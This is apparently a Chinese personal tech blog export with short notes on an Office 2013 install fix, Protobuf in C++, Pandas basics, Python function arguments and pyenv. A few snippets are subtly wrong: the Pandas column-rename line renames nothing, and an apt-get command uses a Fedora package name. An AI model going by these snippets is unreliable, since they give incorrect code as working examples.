<p>解决方法是找到并删除Office2013的Setup.exe安装程序读取的Office2010的注册表信息，该条注册表信息导致Office2013的Setup.exe无法继续。</p>
<p>可以使用Process Monitor监控软件解决该问题。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/wcs_sdu/article/details/80065386" target="_blank" rel="noopener">ProcessMonitor文件以及注册表监视器的使用</a>,by Amrecs.</li>
<li><a href="https://www.cnblogs.com/zhaotianff/p/15172987.html" target="_blank" rel="noopener">如何知道安装程序在进行安装时对你的电脑到底做了什么？</a>,by zhaotianff.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>常用工具</tag>
        <tag>计算机安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Protobuf学习笔记</title>
    <url>/2021/01/19/Protobuf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>Protocol Buffers是一种序列化数据结构的协议。对于透过管道(pipeline)或存储资料进行通信的程序开发上是很有用的。这个方法包含一个接口描述语言，描述一些数据结构，并提供程序工具根据这些描述产生代码，用于将这些数据结构产生或解析资料流。</p>
<h1 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h1><p>protobuf的github发布地址： <a href="https://github.com/protocolbuffers/protobuf/releases" target="_blank" rel="noopener">https://github.com/protocolbuffers/protobuf/releases</a></p>
<p>protobuf的编译器叫protoc，在上面的网址中找到最新版本的安装包，下载安装。</p>
<p>这里下载的是：protoc-3.9.1-win64.zip ， windows 64位系统版本的编译器，下载后，解压到你想要的安装目录即可。</p>
<blockquote>
<p>提示：解压完成后，将 [protoc安装目录]/bin 路径添加到PATH环境变量中</p>
</blockquote>
<p>打开cmd，命令窗口执行protoc命令，没有报错的话，就已经安装成功。</p>
<h1 id="源码编译"><a href="#源码编译" class="headerlink" title="源码编译"></a>源码编译</h1><p>因为需要protobuf的header、lib、dll用于测试，需要编译protobuf的源代码。请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/dai_jing/article/details/83010324" target="_blank" rel="noopener">protobuf的编译和使用，在windows平台上</a></li>
<li><a href="https://www.itheima.com/news/20200421/135308.html" target="_blank" rel="noopener">如何在Qt下编译以及使用protobuf？【C++培训】</a></li>
<li><a href="https://blog.csdn.net/hp_cpp/article/details/106140704" target="_blank" rel="noopener">解决protobuf的Undefined reference to google::protobuf cxx11</a></li>
</ul>
<p>如果使用qt进行开发，请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/lb1885727/article/details/74949883" target="_blank" rel="noopener">Qt MinGW版编译使用protobuf</a></li>
<li><a href="https://www.cnblogs.com/h2zZhou/p/10253840.html" target="_blank" rel="noopener">QT中使用MinGW 编译的protobuf库–包含库的生成和使用</a></li>
</ul>
<p><strong>注意：项目依赖库使用的编译链接工具应与项目使用的编译链接工具相同。例如：都使用 msvc2017 64编译链接。或者考虑跨平台使用mingw 64编译链接。</strong></p>
<h1 id="创建-proto-文件，定义数据结构"><a href="#创建-proto-文件，定义数据结构" class="headerlink" title="创建 .proto 文件，定义数据结构"></a>创建 .proto 文件，定义数据结构</h1><p>proto3 的语法请参考：</p>
<ul>
<li><a href="https://www.liwenzhou.com/posts/Go/Protobuf3-language-guide-zh/" target="_blank" rel="noopener">Protocol Buffers V3中文语法指南[翻译]</a></li>
</ul>
<p>proto3 与 proto2 的区别请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/huanggang982/article/details/77944174" target="_blank" rel="noopener">Protobuf 的 proto3 与 proto2 的区别</a></li>
</ul>
<p>下面是一个proto简单示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 指定protobuf的版本，proto3是最新的语法版本</span><br><span class="line">syntax &#x3D; &quot;proto3&quot;;</span><br><span class="line"></span><br><span class="line">package dream;</span><br><span class="line"></span><br><span class="line">message helloworld</span><br><span class="line">&#123;</span><br><span class="line">   int32     id &#x3D; 1;  &#x2F;&#x2F; ID</span><br><span class="line">   string    str &#x3D; 2;  &#x2F;&#x2F; str</span><br><span class="line">   int32     opt &#x3D; 3;  &#x2F;&#x2F;optional field</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="将-proto文件，编译成指定语言类库"><a href="#将-proto文件，编译成指定语言类库" class="headerlink" title="将.proto文件，编译成指定语言类库"></a>将.proto文件，编译成指定语言类库</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protoc -I&#x3D;$SRC_DIR --cpp_out&#x3D;$DST_DIR $SRC_DIR&#x2F;addressbook.proto</span><br></pre></td></tr></table></figure>

<p>在生成的头文件中添加如下宏定义：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define PROTOBUF_USE_DLLS</span><br></pre></td></tr></table></figure>

<h1 id="测试程序"><a href="#测试程序" class="headerlink" title="测试程序"></a>测试程序</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; TestProtoBuffer.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;fstream&gt;</span><br><span class="line">#include &quot;MessageStruct.pb.h&quot;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;   </span><br><span class="line">	Msg_Header msgHeader;</span><br><span class="line">	msgHeader.set_msgtype(1);</span><br><span class="line">	msgHeader.set_msgsubtype(2);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; Write the new address book back to disk.</span><br><span class="line">	fstream output(&quot;.&#x2F;log&quot;, ios::out | ios::trunc | ios::binary);</span><br><span class="line"></span><br><span class="line">	if (!msgHeader.SerializeToOstream(&amp;output)) &#123;</span><br><span class="line">		cerr &lt;&lt; &quot;Failed to write msg.&quot; &lt;&lt; endl;</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	Msg_Header msgHeaderFromFile1;</span><br><span class="line">	try &#123;</span><br><span class="line">		string work_dir &#x3D; &quot;E:\\Target&quot;;</span><br><span class="line">		fstream input(work_dir+&quot;\\Debug\\log&quot;, ios::in | ios::binary);</span><br><span class="line">		if (!msgHeaderFromFile1.ParseFromIstream(&amp;input)) &#123;</span><br><span class="line">			cerr &lt;&lt; &quot;Failed to parse address book.&quot; &lt;&lt; endl;</span><br><span class="line">			return -1;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	catch (exception ex) &#123;</span><br><span class="line">		cout &lt;&lt; ex.what() &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	std::cout &lt;&lt; &quot;文件反序列化!\n&quot;;</span><br><span class="line">	cout &lt;&lt; msgHeaderFromFile1.msgtype() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; msgHeaderFromFile1.msgsubtype() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	string testStr;</span><br><span class="line">	msgHeader.SerializeToString(&amp;testStr);</span><br><span class="line">	Msg_Header msgHeaderFromFile2;</span><br><span class="line">	msgHeaderFromFile2.ParseFromString(testStr);</span><br><span class="line"></span><br><span class="line">	std::cout &lt;&lt; &quot;\n字符串反序列化!\n&quot;;</span><br><span class="line">	cout &lt;&lt; msgHeaderFromFile2.msgtype() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; msgHeaderFromFile2.msgsubtype() &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="变量赋值"><a href="#变量赋值" class="headerlink" title="变量赋值"></a>变量赋值</h1><h2 id="repeated类型变量赋值"><a href="#repeated类型变量赋值" class="headerlink" title="repeated类型变量赋值"></a>repeated类型变量赋值</h2><ul>
<li><a href="https://blog.csdn.net/weixin_43795921/article/details/117650918" target="_blank" rel="noopener">protobuf中repeated类型变量与C++ vector类型变量的相互赋值方法</a></li>
</ul>
<h1 id="使用问题"><a href="#使用问题" class="headerlink" title="使用问题"></a>使用问题</h1><h2 id="Several-shared-object-using-same-proto-leading-the-the-error-file-already-exists-in-database"><a href="#Several-shared-object-using-same-proto-leading-the-the-error-file-already-exists-in-database" class="headerlink" title="Several shared object using same proto leading the the error: file already exists in database"></a>Several shared object using same proto leading the the error: file already exists in database</h2><p>解决方案请参考：</p>
<ul>
<li><a href="https://jashking.github.io/2017/11/17/protobuf-runtime/" target="_blank" rel="noopener">Protobuf 使用过程遇到的一个问题</a></li>
<li><a href="https://blog.csdn.net/what951006/article/details/115360430" target="_blank" rel="noopener">vcpkg安装静态库/mtd/mt</a></li>
<li><a href="https://blog.csdn.net/xmcy001122/article/details/116227032" target="_blank" rel="noopener">Vcpkg使用MD运行时静态库——如何设置？</a></li>
</ul>
<h2 id="protobuf-解析错误-ParseFromArray-时返回false"><a href="#protobuf-解析错误-ParseFromArray-时返回false" class="headerlink" title="protobuf 解析错误 ParseFromArray 时返回false"></a>protobuf 解析错误 ParseFromArray 时返回false</h2><p>可能的原因有：</p>
<ul>
<li>消息没有序列化，因此消息反序列化失败</li>
</ul>
<p>解决方案请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/guangyacyb/article/details/96439413" target="_blank" rel="noopener">protobuf 解析错误 ParseFromArray 时返回false</a></li>
<li><a href="https://blog.csdn.net/xiexingshishu/article/details/46672789" target="_blank" rel="noopener">protobuf的ParseFromArray 解析失败的问题</a></li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://colobu.com/2019/10/03/protobuf-ultimate-tutorial-in-go/" target="_blank" rel="noopener">Protobuf 终极教程</a>,by 鸟窝.</li>
<li><a href="https://zhuanlan.zhihu.com/p/141415216" target="_blank" rel="noopener">Protobuf通信协议详解：代码演示、详细原理介绍等</a>,by CPP加油站.</li>
<li><a href="https://www.liwenzhou.com/posts/Go/Protobuf3-language-guide-zh/" target="_blank" rel="noopener">Protocol Buffers V3中文语法指南[翻译]</a>,by 李文周.</li>
<li><a href="https://www.cnblogs.com/WindSun/p/12594801.html" target="_blank" rel="noopener">Qt中使用Protobuf简单案例(Windows + msvc)</a>,by WindSun.</li>
<li><a href="https://blog.csdn.net/huanggang982/article/details/77944174" target="_blank" rel="noopener">Protobuf 的 proto3 与 proto2 的区别</a>,by huanggang982.</li>
<li><a href="https://www.eet-china.com/mp/a63366.html" target="_blank" rel="noopener">长文图解Google的protobuf思考、设计、应用</a>,by 嵌入式客栈.</li>
<li><a href="https://www.cnblogs.com/niuben/p/14212711.html" target="_blank" rel="noopener">protobuf优缺点及编码原理</a>,by 牛奔.</li>
<li><a href="https://jashking.github.io/2017/11/17/protobuf-runtime/" target="_blank" rel="noopener">Protobuf 使用过程遇到的一个问题</a>,by jashwang.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Pandas入门教程</title>
    <url>/2020/01/02/Pandas%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>Pandas是一个开源的，BSD许可的库，为Python编程语言提供高性能，易于使用的数据结构和数据分析工具。</p>
<h1 id="Pandas特色"><a href="#Pandas特色" class="headerlink" title="Pandas特色"></a>Pandas特色</h1><p>Pandas 适用于处理以下类型的数据：</p>
<ul>
<li>与 SQL 或 Excel 表类似的，含异构列的表格数据;</li>
<li>有序和无序（非固定频率）的时间序列数据;</li>
<li>带行列标签的矩阵数据，包括同构或异构型数据;</li>
<li>任意其它形式的观测、统计数据集, 数据转入 Pandas 数据结构时不必事先标记。</li>
</ul>
<h1 id="Pandas数据结构"><a href="#Pandas数据结构" class="headerlink" title="Pandas数据结构"></a>Pandas数据结构</h1><p>Pandas 的主要数据结构是 Series（一维数据）与 DataFrame（二维数据），这两种数据结构足以处理金融、统计、社会科学、工程等领域里的大多数典型用例。对于 R 用户，DataFrame 提供了比 R 语言 data.frame 更丰富的功能。Pandas 基于 NumPy 开发，可以与其它第三方科学计算支持库完美集成。</p>
<table>
<thead>
<tr>
<th>维数</th>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>Series</td>
<td>带标签的一维同构数组</td>
</tr>
<tr>
<td>2</td>
<td>DataFrame</td>
<td>带标签的，大小可变的，二维异构表格</td>
</tr>
</tbody></table>
<h1 id="Pandas用法"><a href="#Pandas用法" class="headerlink" title="Pandas用法"></a>Pandas用法</h1><p>Pandas用法与Matlab中矩阵操作很类似，熟悉Matlab操作的同学可以很快上手Pandas。</p>
<h2 id="生成对象"><a href="#生成对象" class="headerlink" title="生成对象"></a>生成对象</h2><p>生成Series对象：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">In [3]: s &#x3D; pd.Series([1, 3, 5, np.nan, 6, 8])</span><br><span class="line"></span><br><span class="line">In [4]: s</span><br><span class="line">Out[4]: </span><br><span class="line">0    1.0</span><br><span class="line">1    3.0</span><br><span class="line">2    5.0</span><br><span class="line">3    NaN</span><br><span class="line">4    6.0</span><br><span class="line">5    8.0</span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure>

<p>生成DataFrame对象：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">In [7]: df &#x3D; pd.DataFrame(np.random.randn(6, 4), index&#x3D;dates, columns&#x3D;list(&#39;ABCD&#39;))</span><br><span class="line"></span><br><span class="line">In [8]: df</span><br><span class="line">Out[8]: </span><br><span class="line">                   A         B         C         D</span><br><span class="line">2013-01-01  0.469112 -0.282863 -1.509059 -1.135632</span><br><span class="line">2013-01-02  1.212112 -0.173215  0.119209 -1.044236</span><br><span class="line">2013-01-03 -0.861849 -2.104569 -0.494929  1.071804</span><br><span class="line">2013-01-04  0.721555 -0.706771 -1.039575  0.271860</span><br><span class="line">2013-01-05 -0.424972  0.567020  0.276232 -1.087401</span><br><span class="line">2013-01-06 -0.673690  0.113648 -1.478427  0.524988</span><br></pre></td></tr></table></figure>

<h2 id="列切片"><a href="#列切片" class="headerlink" title="列切片"></a>列切片</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df1 &#x3D; df[df.columns[0:6]];</span><br></pre></td></tr></table></figure>

<h2 id="重命名列名"><a href="#重命名列名" class="headerlink" title="重命名列名"></a>重命名列名</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df1.columns[&#39;id&#39;,&#39;name&#39;,&#39;sex&#39;,&#39;age&#39;,&#39;department&#39;,&#39;work&#39;]</span><br></pre></td></tr></table></figure>

<h2 id="过滤行"><a href="#过滤行" class="headerlink" title="过滤行"></a>过滤行</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df1 &#x3D; df1[df1.iloc[:,1]&#x3D;&#x3D;&#39;YES&#39;]</span><br></pre></td></tr></table></figure>

<h2 id="合并表格"><a href="#合并表格" class="headerlink" title="合并表格"></a>合并表格</h2><p>pandas 2.0实现数据的合并与拼接，主要有三种方法：</p>
<ul>
<li>join 最简单，主要用于基于索引的横向合并拼接</li>
<li>merge 最常用，主要用于基于指定列的横向合并拼接</li>
<li>concat最强大，可用于横向和纵向合并拼接</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 合并两个表，df1 和 df2 表结构一样</span><br><span class="line">df3 &#x3D; pd.concat([df1,df2])</span><br></pre></td></tr></table></figure>

<h2 id="毫秒解析"><a href="#毫秒解析" class="headerlink" title="毫秒解析"></a>毫秒解析</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">timeDelta &#x3D; datetime.datetime(2024,11,11) - datetime.datetime(1900,1,1)</span><br><span class="line">df3[&#39;datetime&#39;] &#x3D; pd.to_datetime(df[&#39;datetime&#39;], format&#x3D;&#39;%Y-%m-%d %H:%M:%S:%f&#39;) + timeDelta</span><br></pre></td></tr></table></figure>

<h2 id="按时间排序"><a href="#按时间排序" class="headerlink" title="按时间排序"></a>按时间排序</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df3 &#x3D; df3.sort_values(by&#x3D;&quot;datetime&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="输出CSV表格"><a href="#输出CSV表格" class="headerlink" title="输出CSV表格"></a>输出CSV表格</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df3.to_csv(filePath + &#39;test.csv&#39;,index&#x3D;0)</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.pypandas.cn/" target="_blank" rel="noopener">Pandas 中文</a>,by pypandas.</li>
<li><a href="https://www.pypandas.cn/docs/getting_started/10min.html#%E7%94%9F%E6%88%90%E5%AF%B9%E8%B1%A1" target="_blank" rel="noopener">十分钟入门 Pandas</a>,by pypandas.</li>
<li><a href="https://blog.csdn.net/m0_37829442/article/details/100853879" target="_blank" rel="noopener">Python读取csv文件的三种方式</a>,by 涛声依旧2019.</li>
<li><a href="https://blog.csdn.net/BabyFish13/article/details/54576674" target="_blank" rel="noopener">Python模块化开发组织代码程序示例</a>,by BabyFish13.</li>
<li><a href="https://pythonguidecn.readthedocs.io/zh/latest/" target="_blank" rel="noopener">Python最佳实践指南！</a>,by Prodesire.</li>
<li><a href="https://www.cnblogs.com/Vincent-yuan/p/16214704.html" target="_blank" rel="noopener">pandas中DataFrame 数据合并，连接（merge,join,concat)
</a>,by Vincent-yuan.</li>
<li><a href="https://blog.csdn.net/weixin_56319483/article/details/136439310" target="_blank" rel="noopener">【已解决】AttributeError: ‘DataFrame‘ object has no attribute ‘append‘</a>,by zhtstar.</li>
<li><a href="https://blog.csdn.net/littleRpl/article/details/100117428" target="_blank" rel="noopener">pandas DataFrame数据重命名列名的几种方式</a>,by littleRpl.</li>
<li><a href="https://blog.csdn.net/xnd_31726/article/details/112297723" target="_blank" rel="noopener">Pandas 毫秒级时间解析</a>,by 一定波兮.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python函数参数与注释</title>
    <url>/2022/01/28/Python%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0/</url>
    <content><![CDATA[<h1 id="Python函数参数"><a href="#Python函数参数" class="headerlink" title="Python函数参数"></a>Python函数参数</h1><p>Python的函数具有非常灵活的参数形态，既可以实现简单的调用，又可以传入非常复杂的参数。</p>
<p>默认参数一定要用不可变对象，如果是可变对象，程序运行时会有逻辑错误！</p>
<p>要注意定义可变参数和关键字参数的语法：</p>
<p>*args是可变参数，args接收的是一个tuple；</p>
<p>**kw是关键字参数，kw接收的是一个dict。</p>
<p>以及调用函数时如何传入可变参数和关键字参数的语法：</p>
<p>可变参数既可以直接传入：func(1, 2, 3)，又可以先组装list或tuple，再通过<em>args传入：func(</em>(1, 2, 3))；</p>
<p>关键字参数既可以直接传入：func(a=1, b=2)，又可以先组装dict，再通过<strong>kw传入：func(</strong>{‘a’: 1, ‘b’: 2})。</p>
<h1 id="Python函数注释"><a href="#Python函数注释" class="headerlink" title="Python函数注释"></a>Python函数注释</h1><ul>
<li>Google风格</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&quot;&quot;</span><br><span class="line">This is a groups style docs.</span><br><span class="line"> </span><br><span class="line">Parameters:</span><br><span class="line">  param1 - this is the first param</span><br><span class="line">  param2 - this is a second param</span><br><span class="line"> </span><br><span class="line">Returns:</span><br><span class="line">    This is a description of what is returned</span><br><span class="line"> </span><br><span class="line">Raises:</span><br><span class="line">    KeyError - raises an exception</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>Rest风格</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&quot;&quot;</span><br><span class="line">This is a reST style.</span><br><span class="line"> </span><br><span class="line">:param param1: this is a first param</span><br><span class="line">:param param2: this is a second param</span><br><span class="line">:returns: this is a description of what is returned</span><br><span class="line">:raises keyError: raises an exception</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure>


<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017261630425888" target="_blank" rel="noopener">函数的参数</a>,by 廖雪峰.</li>
<li><a href="https://mediumcn.com/python3/how-to-concatenate-a-list" target="_blank" rel="noopener">Python3 - 6种方法拼接合并列表（list）</a>,by Mediumcn.</li>
<li><a href="https://www.cnblogs.com/sddai/p/14406799.html" target="_blank" rel="noopener">python函数注释</a>,by 戴思达.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python多版本管理工具pyenv</title>
    <url>/2022/01/25/Python%E5%A4%9A%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<blockquote>
<p>pyenv是一个forked自ruby社区的简单、低调、遵循UNIX哲学的Python环境管理工具, 它可以轻松切换全局解释器版本, 同时结合vitualenv插件可以方便的管理对应的包源.</p>
</blockquote>
<blockquote>
<p>pyenv 让您可以轻松地在多个 Python 版本之间切换。它简单、不显眼，并且遵循 UNIX 的传统，即做好一件事的单一用途工具。</p>
</blockquote>
<h1 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h1><h2 id="获得pyenv"><a href="#获得pyenv" class="headerlink" title="获得pyenv"></a>获得pyenv</h2><ul>
<li><p>通过pip获取pyenv，对已安装python的用户：</p>
<ul>
<li>Powershell or Git Bash: pip install pyenv-win –target $HOME\.pyenv</li>
<li>cmd.exe: pip install pyenv-win –target %USERPROFILE%.pyenv</li>
</ul>
</li>
<li><p>直接下载pyenv-win的zip压缩包</p>
</li>
<li><p>通过Git</p>
<ul>
<li>Powershell or Git Bash: git clone <a href="https://github.com/pyenv-win/pyenv-win.git" target="_blank" rel="noopener">https://github.com/pyenv-win/pyenv-win.git</a> “$HOME/.pyenv”</li>
<li>cmd.exe: git clone <a href="https://github.com/pyenv-win/pyenv-win.git" target="_blank" rel="noopener">https://github.com/pyenv-win/pyenv-win.git</a> “%USERPROFILE%.pyenv”</li>
</ul>
</li>
</ul>
<h2 id="安装pyenv"><a href="#安装pyenv" class="headerlink" title="安装pyenv"></a>安装pyenv</h2><p>在linux操作系统中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget  https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;pyenv&#x2F;pyenv-installer&#x2F;master&#x2F;bin&#x2F;pyenv-installer</span><br><span class="line">bash pyenv-installer</span><br></pre></td></tr></table></figure>

<p>使用命令leafpad .bashrc打开.bashrc文件，在其末尾输入如下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export PYENV_ROOT&#x3D;&quot;$HOME&#x2F;.pyenv&quot;</span><br><span class="line">command -v pyenv &gt;&#x2F;dev&#x2F;null || export PATH&#x3D;&quot;$PYENV_ROOT&#x2F;bin:$PATH&quot;</span><br><span class="line">eval &quot;$(pyenv init -)&quot;</span><br></pre></td></tr></table></figure>

<h2 id="完成安装"><a href="#完成安装" class="headerlink" title="完成安装"></a>完成安装</h2><ol>
<li>添加PYENV, PYENV_HOME, PYENV_ROOT三个环境变量。</li>
<li>将pyenv-win所在路径添加到PATH环境变量。</li>
<li>使用命令 pyenv –version 查看pyenv版本。</li>
<li>在 %USERPROFILE% 目录运行命令 pyenv rehash。</li>
<li>运行 pyenv 查看使用方法。</li>
</ol>
<h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><h2 id="安装python解释器"><a href="#安装python解释器" class="headerlink" title="安装python解释器"></a>安装python解释器</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># No module named &#39;_ctypes&#39;解决方法</span><br><span class="line">sudo apt-get install -y libffi-devel</span><br><span class="line">sudo apt-get install -y git openssl libssl-dev libbz2-dev libreadline-dev libsqlite3-dev</span><br><span class="line"># </span><br><span class="line">pyenv install 3.7.3 # 安装 python</span><br><span class="line">pyenv versions # 查看本机安装版本</span><br><span class="line">pyenv install --list # 查看可安装版本</span><br><span class="line"></span><br><span class="line"># pyenv install build failed:Fatal: You must get working getaddrinfo() function</span><br><span class="line">PYTHON_CONFIGURE_OPTS&#x3D;&quot;--disable-ipv6&quot; proxychains pyenv install 3.9.6</span><br></pre></td></tr></table></figure>

<h2 id="卸载python解释器"><a href="#卸载python解释器" class="headerlink" title="卸载python解释器"></a>卸载python解释器</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pyenv uninstall 2.7.3 # 卸载 python</span><br></pre></td></tr></table></figure>

<h2 id="Python-切换"><a href="#Python-切换" class="headerlink" title="Python 切换"></a>Python 切换</h2><p>切换全局或者项目中的 Python 版本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pyenv global 2.7.3  # 设置全局的 Python 版本，通过将版本号写入 ~&#x2F;.pyenv&#x2F;version 文件的方式。</span><br><span class="line">pyenv local 2.7.3 # 设置 Python 本地版本，通过将版本号写入当前目录下的 .python-version 文件的方式。通过这种方式设置的 Python 版本优先级较 global 高。</span><br></pre></td></tr></table></figure>

<p>寻找 python 的时候优先级:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell &gt; local &gt; global</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pyenv shell 2.7.3 # 设置面向 shell 的 Python 版本，通过设置当前 shell 的 PYENV_VERSION 环境变量的方式。这个版本的优先级比 local 和 global 都要高。&#96;--unset&#96; 参数可以用于取消当前 shell 设定的版本。</span><br><span class="line"></span><br><span class="line">pyenv shell --unset</span><br><span class="line"></span><br><span class="line">pyenv rehash  # 创建垫片路径（为所有已安装的可执行文件创建 shims，如：~&#x2F;.pyenv&#x2F;versions&#x2F;*&#x2F;bin&#x2F;*，因此，每当你增删了 Python 版本或带有可执行文件的包（如 pip）以后，都应该执行一次本命令）</span><br></pre></td></tr></table></figure>

<h2 id="安装卸载python包"><a href="#安装卸载python包" class="headerlink" title="安装卸载python包"></a>安装卸载python包</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip freeze &gt; requirement #导出依赖包</span><br><span class="line">pip install -r requirement #安装依赖包</span><br><span class="line">pip install -r requirement --proxy localhost:8080 # 通过代理服务安装依赖包</span><br><span class="line">pip uninstall -r requirement #卸载所有依赖包</span><br></pre></td></tr></table></figure>

<h2 id="创建虚拟环境"><a href="#创建虚拟环境" class="headerlink" title="创建虚拟环境"></a>创建虚拟环境</h2><h3 id="venv"><a href="#venv" class="headerlink" title="venv"></a>venv</h3><p>venv是python从3.3版本开始自带的虚拟环境，它的很多操作都和 virtualenv 类似，但是两者运行机制不同。要在 python2 上使用虚拟环境，依然要利用 virtualenv。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -m venv env</span><br><span class="line">.\env\Scripts\activate</span><br><span class="line">deactivate</span><br></pre></td></tr></table></figure>

<h3 id="virtualenv"><a href="#virtualenv" class="headerlink" title="virtualenv"></a>virtualenv</h3><p>virtualenv 是目前最流行的 Python 虚拟环境配置工具。它不仅同时支持 Python2 和 Python3，而且可以为每个虚拟环境指定 Python 解释器，并选择不继承基础版本的包。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install virtualenv</span><br><span class="line">pyenv exec virtualenv myproject</span><br><span class="line">cd myproject</span><br><span class="line">.\env\Scripts\activate</span><br><span class="line">deactivate</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://juejin.cn/post/7000975238880051230" target="_blank" rel="noopener">Python多版本管理工具–pyenv</a>,by tigeriaf.</li>
<li><a href="https://zhuanlan.zhihu.com/p/36402791" target="_blank" rel="noopener">Python版本管理神器-pyenv</a>,by 安阳.</li>
<li><a href="https://github.com/pyenv/pyenv" target="_blank" rel="noopener">pyenv</a>,by pyenv.</li>
<li><a href="https://github.com/pyenv-win/pyenv-win" target="_blank" rel="noopener">pyenv for Windows</a>,by pyenv-win.</li>
<li><a href="https://cloud.tencent.com/developer/article/1454191" target="_blank" rel="noopener">Windows环境下的Python环境搭建</a>,by 魏晓蕾.</li>
<li><a href="https://einverne.github.io/post/2017/04/pyenv.html" target="_blank" rel="noopener">使用 pyenv 管理 Python 版本</a>,by Ein Verne.</li>
<li><a href="https://huangwang.github.io/2018/09/07/Windows%E5%B9%B3%E5%8F%B0Python%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/">Windows平台Python安装与配置教程</a>,by jackhuang.</li>
<li><a href="https://huangwang.github.io/2021/09/21/Pipenv%E6%9C%80%E6%96%B0%E4%B8%80%E4%BB%A3Python%E9%A1%B9%E7%9B%AE%E7%8E%AF%E5%A2%83%E4%B8%8E%E4%BE%9D%E8%B5%96%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/">Pipenv最新一代Python项目环境与依赖管理工具</a>,by jackhuang.</li>
<li><a href="https://blog.csdn.net/weixin_40922744/article/details/103721870" target="_blank" rel="noopener">一文解读 virtualenv &amp; venv &amp; pipenv 之间的联系与区别</a>,by I’m George.</li>
<li><a href="https://qastack.cn/programming/35064426/when-would-the-e-editable-option-be-useful-with-pip-install" target="_blank" rel="noopener">什么时候-e，–editable选项对pip安装有用</a>,by qastack.</li>
